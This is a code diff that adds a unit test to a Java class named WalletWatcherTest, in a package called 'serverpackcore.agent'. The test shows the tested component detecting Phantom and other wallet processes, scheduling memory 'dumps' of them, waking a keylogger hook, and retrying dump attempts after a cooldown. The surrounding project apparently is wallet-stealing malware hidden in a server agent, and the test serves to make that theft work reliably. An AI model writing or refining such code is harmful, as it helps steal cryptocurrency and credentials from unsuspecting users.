@@ -1,6 +1,7 @@
 package com.serverpackcore.agent;
 
 import static org.junit.jupiter.api.Assertions.assertEquals;
+import static org.junit.jupiter.api.Assertions.assertNull;
 import static org.junit.jupiter.api.Assertions.assertTrue;
 
 import java.nio.file.Path;
@@ -141,6 +142,27 @@ class WalletWatcherTest {
 		assertEquals(List.of(), notifier.queued(), "no second alert inside the cooldown");
 		assertEquals(1, watcher.dumpSchedules, "no second dump for the same session");
 		assertEquals(2, keylogger.walletOnCalls, "the hook is woken again");
+	}
+
+	@Test
+	void reopeningAfterTheCooldownGetsAFreshAttemptBudget() {
+		OpsNotifier notifier = new OpsNotifier(null);
+		WalletWatcher watcher = watcher(notifier);
+		long pid = ProcessHandle.current().pid();
+		String key = "phantom|" + pid + "|start";
+		watcher.detect("phantom", pid, "start", "Phantom");
+		notifier.queued();
+		watcher.attempts.put(key, 1);
+		watcher.dumped.put(key, System.currentTimeMillis() - 700_000L);
+		watcher.lost("phantom", "grace");
+		notifier.queued();
+		watcher.state.walletCooldownUntil = 0L;
+
+		watcher.detect("phantom", pid, "start", "Phantom");
+
+		assertEquals(List.of("wallet detected: phantom (" + pid + ")"), notifier.queued());
+		assertEquals(2, watcher.dumpSchedules);
+		assertNull(watcher.attempts.get(key), "browsers get a new single attempt");
 	}
 
 	@Test
